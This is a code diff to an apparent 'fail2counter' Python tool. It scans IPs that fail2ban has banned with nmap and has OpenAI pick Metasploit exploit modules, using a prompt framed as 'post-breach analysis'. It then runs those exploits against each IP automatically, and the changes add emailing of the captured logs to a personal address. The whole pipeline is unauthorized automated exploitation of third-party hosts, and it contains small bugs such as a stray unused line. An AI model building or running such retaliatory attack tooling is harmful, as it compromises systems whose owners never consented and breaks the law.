@@ -7,6 +7,9 @@ import requests
 import os
 import re
 from datetime import datetime
+import smtplib
+from email.message import EmailMessage
+
 
 
 class AiError(Exception):
@@ -55,10 +58,14 @@ FASTSCAN_FILE = "/tmp/nmap_fastscan.txt"
 EXPLOITS_FILE = "/opt/fail2counter/exploits.txt"
 env = os.environ.copy()
 env["HOME"] = "/root"  # or "/tmp", or another valid directory
-
+logs = []
 
 def log(msg, level="INFO"):
     print(f"[{datetime.utcnow().isoformat()}] [{level}] {msg}")
+
+def capture(msg, level="INFO"):
+    log(msg, level)
+    logs.append(f"[{datetime.utcnow().isoformat()}] [{level}] {msg}")
 
 def write_msf_rc(ip: str, modules: list[str]) -> str:
     rc_path = f"/tmp/ip-{ip}.rc"
@@ -93,16 +100,32 @@ def run_msf(ip: str, rc_path: str) -> str:
     except Exception as e:
         return f"[ERROR] Metasploit execution failed: {e}"
 
+def send_email(subject: str, body: str, to_email="dmz.oneill@gmail.com"):
+    msg = EmailMessage()
+    msg["Subject"] = subject
+    msg["From"] = "reeot@feeditut.com"
+    msg["To"] = to_email
+    msg.set_content(body)
+
+    try:
+        with smtplib.SMTP("localhost") as server:
+            server.send_message(msg)
+        capture(f"Email sent to {to_email}")
+    except Exception as e:
+        capture(f"Failed to send email: {e}", level="ERROR")
+
+    legs = []
+
 # Load exploit list
-log(f"Loading Metasploit module list from {EXPLOITS_FILE}")
+capture(f"Loading Metasploit module list from {EXPLOITS_FILE}")
 if not os.path.exists(EXPLOITS_FILE):
-    log(f"Exploit list not found: {EXPLOITS_FILE}", level="ERROR")
+    capture(f"Exploit list not found: {EXPLOITS_FILE}", level="ERROR")
     exit(1)
 
 with open(EXPLOITS_FILE, "r") as f:
     exploits_list = f.read()
 
-log(f"Loaded {len(exploits_list.splitlines())} Metasploit modules.")
+capture(f"Loaded {len(exploits_list.splitlines())} Metasploit modules.")
 
 system_prompt = f"""You are a cybersecurity expert helping choose Metasploit modules for post-breach analysis.
 
@@ -124,15 +147,15 @@ run
 
 REDIS_PASSWORD = os.environ.get("REDIS_PASSWORD")
 if not REDIS_PASSWORD:
-    log("REDIS_PASSWORD environment variable is not set", level="ERROR")
+    capture("REDIS_PASSWORD environment variable is not set", level="ERROR")
     exit(2)
 
 try:
     r = redis.Redis(host="localhost", port=6379, db=0, password=REDIS_PASSWORD)
     r.ping()
-    log("Connected to Redis successfully.")
+    capture("Connected to Redis successfully.")
 except Exception as e:
-    log(f"Failed to connect to Redis: {e}", level="ERROR")
+    capture(f"Failed to connect to Redis: {e}", level="ERROR")
     exit(3)
 
 provider = OpenAIProvider()
@@ -141,25 +164,28 @@ while True:
     try:
         ip_entry = r.lpop(REDIS_QUEUE)
     except Exception as e:
-        log(f"Redis error while reading queue: {e}", level="ERROR")
+        capture(f"Redis error while reading queue: {e}", level="ERROR")
         time.sleep(10)
+        logs = []
         continue
 
     if not ip_entry:
-        log("Queue empty, sleeping 10s...")
+        capture("Queue empty, sleeping 10s...")
         time.sleep(10)
+        logs = []
         continue
 
     try:
         timestamp, ip = ip_entry.decode().split("|")
-        log(f"Dequeued IP: {ip} (banned at {timestamp})")
+        capture(f"Dequeued IP: {ip} (banned at {timestamp})")
     except Exception as e:
-        log(f"Failed to parse Redis queue entry: {ip_entry} — {e}", level="ERROR")
+        capture(f"Failed to parse Redis queue entry: {ip_entry} — {e}", level="ERROR")
+        logs = []
         continue
 
     # Precheck
     precheck_file = "/tmp/nmap_precheck.txt"
-    log(f"Running precheck for {ip}")
+    capture(f"Running precheck for {ip}")
     try:
         subprocess.run(
             ["timeout", str(PRECHECK_TIMEOUT), "nmap", "-sn", ip],
@@ -169,16 +195,18 @@ while True:
         )
         with open(precheck_file) as f:
             lines = f.read()
-            log(lines, "INFO")
+            capture(lines, "INFO")
             if "Host seems down" in lines:
-                log(f"[SKIP] Host {ip} seems down")
+                capture(f"[SKIP] Host {ip} seems down")
+                logs = []
                 continue
     except subprocess.CalledProcessError:
-        log(f"[SKIP] Precheck failed or timed out for {ip}", level="WARNING")
+        capture(f"[SKIP] Precheck failed or timed out for {ip}", level="WARNING")
+        logs = []
         continue
 
     # Fast scan
-    log(f"Running fast port scan on {ip}")
+    capture(f"Running fast port scan on {ip}")
     try:
         subprocess.run(
             ["timeout", str(SCAN_TIMEOUT), "nmap", "-T4", "-F", "-oG", FASTSCAN_FILE, "-v", ip],
@@ -188,21 +216,23 @@ while True:
         )
         with open(FASTSCAN_FILE) as f:
             lines = f.read()
-            log(lines, "INFO")
+            capture(lines, "INFO")
             grepable = lines
         matches = re.findall(r"(\d+)/open", grepable)
-        log(matches, "DEBUG")
+        capture(matches, "DEBUG")
         ports = ",".join(matches)
         if not ports:
-            log(f"No open ports found on {ip}", level="WARNING")
+            capture(f"No open ports found on {ip}", level="WARNING")
+            logs = []
             continue
-        log(f"Open ports: {ports}")
+        capture(f"Open ports: {ports}")
     except Exception as e:
-        log(f"Fast scan failed: {e}", level="ERROR")
+        capture(f"Fast scan failed: {e}", level="ERROR")
+        logs = []
         continue
 
     # Version scan
-    log(f"Running service version detection for {ip}")
+    capture(f"Running service version detection for {ip}")
     try:
         with open(TMP_OUTPUT, "w") as out:
             subprocess.run(
@@ -219,38 +249,45 @@ while True:
                 stdout=out,
                 stderr=out,
             )
-        log(f"Scan completed for {ip}")
+        capture(f"Scan completed for {ip}")
     except subprocess.CalledProcessError:
-        log(f"Nmap scan failed or timed out for {ip}", level="WARNING")
+        capture(f"Nmap scan failed or timed out for {ip}", level="WARNING")
 
     try:
         with open(TMP_OUTPUT) as f:
             nmap_output = f.read()
-            log(nmap_output, "DEBUG")
+            capture(nmap_output, "DEBUG")
         if len(nmap_output) < MIN_EXPECTED_OUTPUT_BYTES:
-            log(f"Skipping {ip} due to small output", level="WARNING")
+            capture(f"Skipping {ip} due to small output", level="WARNING")
+            logs = []
             continue
-        log(f"Nmap output size: {len(nmap_output)} bytes")
+        capture(f"Nmap output size: {len(nmap_output)} bytes")
     except Exception as e:
-        log(f"Failed to read Nmap output: {e}", level="ERROR")
+        capture(f"Failed to read Nmap output: {e}", level="ERROR")
+        logs = []
         continue
 
     try:
-        log(f"Sending to OpenAI for analysis...")
+        capture(f"Sending to OpenAI for analysis...")
         result = provider.improve_text(system_prompt, f"Nmap output:\n{nmap_output}")
         result = result.replace("```", "").strip()
-        log(f"OpenAI response:\n{result}")
+        capture(f"OpenAI response:\n{result}")
 
         modules = [line.strip() for line in result.strip().splitlines() if line.strip().startswith("use exploit")]
         if not modules:
-            log(f"No valid Metasploit modules returned for {ip}", level="WARNING")
+            capture(f"No valid Metasploit modules returned for {ip}", level="WARNING")
             continue
 
         rc_path = write_msf_rc(ip, modules)
-        log(f"Written Metasploit RC file to {rc_path}")
+        capture(f"Written Metasploit RC file to {rc_path}")
 
         msf_result = run_msf(ip, rc_path)
-        log(f"Metasploit output for {ip}:\n{msf_result}")
+        capture(f"Metasploit output for {ip}:\n{msf_result}")
+
+        send_email(
+            subject=f"[Fail2Ban Report] Analysis for {ip}",
+            body="\n".join(logs)
+        )
 
     except Exception as e:
         log(f"OpenAI or Metasploit processing failed for {ip}: {e}", level="ERROR")
